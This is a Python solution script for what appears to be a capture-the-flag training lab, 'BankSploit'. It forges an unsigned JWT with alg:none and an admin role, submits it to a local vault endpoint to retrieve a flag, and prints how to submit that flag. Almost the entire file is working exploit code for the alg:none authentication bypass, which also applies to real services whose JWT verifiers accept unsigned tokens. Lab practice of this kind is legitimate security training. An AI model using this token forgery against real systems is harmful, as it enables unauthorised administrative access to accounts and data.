#!/usr/bin/env python3
"""
Quick script to forge JWT and retrieve your flag from the vault.
Usage: python3 get_flag.py [customer_id] [localhost_url]
"""

import sys
import json
import base64
import time
import urllib.request
import urllib.error

def forge_admin_jwt(customer_id="BS100001"):
    """Forge an admin JWT with alg:none"""
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "sub": customer_id,
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }

    def b64url_encode(d):
        json_str = json.dumps(d)
        return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()

    h = b64url_encode(header)
    p = b64url_encode(payload)
    return f"{h}.{p}."

def get_flag(token, base_url="http://localhost:9443"):
    """Submit forged JWT to vault endpoint and retrieve flag"""
    url = f"{base_url}/api/v1/auth/vault"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode())
            return data
    except urllib.error.HTTPError as e:
        try:
            error_data = json.loads(e.read().decode())
            return {"ok": False, "error": error_data.get("error", str(e))}
        except:
            return {"ok": False, "error": str(e)}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def main():
    customer_id = sys.argv[1] if len(sys.argv) > 1 else "BS100001"
    base_url = sys.argv[2] if len(sys.argv) > 2 else "http://localhost:9443"

    print("[*] BankSploit JWT Vault - Get Your Flag")
    print("-" * 60)
    print(f"[*] Customer ID: {customer_id}")
    print(f"[*] Target: {base_url}/api/v1/auth/vault")
    print()

    # Step 1: Forge JWT
    print("[1] Forging admin JWT (alg:none)...")
    token = forge_admin_jwt(customer_id)
    print(f"    Token: {token[:50]}...")
    print()

    # Step 2: Submit to vault
    print("[2] Submitting to vault endpoint...")
    result = get_flag(token, base_url)
    print()

    if result.get("ok"):
        print("[OK] Vault unlocked!")
        print()
        flag = result.get("flag", "N/A")
        user = result.get("user", "N/A")
        message = result.get("message", "")

        print(f"Message: {message}")
        print()
        print("-" * 60)
        print(f"🚩 YOUR FLAG: {flag}")
        print("-" * 60)
        print()
        print("[3] Next steps:")
        print(f"    1. Copy the flag: {flag}")
        print(f"    2. Go to: {base_url}/training")
        print(f"    3. Find 'JWT alg:none (auth.l12)' vulnerability")
        print(f"    4. Paste flag in submission box")
        print(f"    5. Click Submit")
        print()
        print("    OR use API:")
        print(f"    curl -X POST \\")
        print(f"      -H 'Content-Type: application/json' \\")
        print(f"      -d '{{\"flag\": \"{flag}\"}}' \\")
        print(f"      {base_url}/api/v1/training/submit-flag")
    else:
        print("[FAIL] Vault rejected the token!")
        print(f"Error: {result.get('error')}")
        print()
        if "Bearer" in result.get("error", ""):
            print("    Hint: Endpoint requires 'Authorization: Bearer <token>'")
        elif "Admin role required" in result.get("error", ""):
            print("    Hint: Token must have role='admin' in payload")
        elif "Invalid or expired token" in result.get("error", ""):
            print("    Hint: Check that JWT is correctly formatted (header.payload.)")

if __name__ == "__main__":
    main()
